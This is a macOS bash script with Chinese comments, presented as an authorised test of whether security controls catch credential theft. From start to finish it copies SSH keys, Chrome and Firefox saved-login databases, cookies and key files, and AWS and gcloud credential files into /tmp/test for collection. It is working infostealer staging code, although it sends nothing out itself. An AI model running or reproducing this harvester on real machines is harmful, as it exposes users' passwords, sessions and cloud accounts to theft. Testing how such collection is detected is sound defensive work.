#!/bin/bash
# -------------------------------------------------------------
# 脚本 2 - 直接收集数据（不绕过隔离），用于测试拦截效果
# 警告：仅用于授权安全测试
# -------------------------------------------------------------

TARGET="/tmp/test"
echo "==================== 脚本开始 ===================="
echo "[*] 当前用户: $(whoami)"
echo "[*] 注意: 若脚本从互联网下载且未移除隔离属性，可能被拦截"

# 准备目录
echo "[*] 创建目标目录: $TARGET"
rm -rf "$TARGET" 2>/dev/null || true
mkdir -p "$TARGET"

# 收集 SSH
echo "[*] 收集 SSH 密钥 (~/.ssh)"
if [ -d "$HOME/.ssh" ]; then
    cp -R "$HOME/.ssh" "$TARGET/ssh_backup"
    echo "[+] 已复制 ~/.ssh"
else
    echo "[-] 未找到 ~/.ssh"
fi

# 收集 Chrome
echo "[*] 收集 Chrome 凭证"
CHROME_BASE="$HOME/Library/Application Support/Google/Chrome"
if [ -d "$CHROME_BASE" ]; then
    mkdir -p "$TARGET/chrome"
    for profile_dir in "$CHROME_BASE"/Default "$CHROME_BASE"/Profile\ *; do
        if [ -d "$profile_dir" ]; then
            profile_name=$(basename "$profile_dir")
            mkdir -p "$TARGET/chrome/$profile_name"
            for file in "Login Data" "Cookies" "Web Data"; do
                if [ -f "$profile_dir/$file" ]; then
                    cp "$profile_dir/$file" "$TARGET/chrome/$profile_name/"
                    echo "[+] Chrome/$profile_name/$file"
                fi
            done
        fi
    done
fi

# 收集 Firefox
echo "[*] 收集 Firefox 凭证"
FIREFOX_PROFILES="$HOME/Library/Application Support/Firefox/Profiles"
if [ -d "$FIREFOX_PROFILES" ]; then
    mkdir -p "$TARGET/firefox"
    for profile in "$FIREFOX_PROFILES"/*.default-release "$FIREFOX_PROFILES"/*.default; do
        if [ -d "$profile" ]; then
            profile_name=$(basename "$profile")
            mkdir -p "$TARGET/firefox/$profile_name"
            cp "$profile"/key4.db "$profile"/logins.json "$profile"/cookies.sqlite "$TARGET/firefox/$profile_name/" 2>/dev/null
            echo "[+] Firefox/$profile_name"
        fi
    done
fi

# 收集云服务凭证
echo "[*] 收集云服务配置文件"
mkdir -p "$TARGET/cloud"
test -f "$HOME/.aws/credentials" && cp "$HOME/.aws/credentials" "$TARGET/cloud/" && echo "[+] AWS credentials"
test -f "$HOME/.config/gcloud/credentials.db" && cp "$HOME/.config/gcloud/credentials.db" "$TARGET/cloud/gcloud_credentials.db" && echo "[+] GCloud"

echo "==================== 完成 ===================="
echo "[+] 输出目录: $TARGET"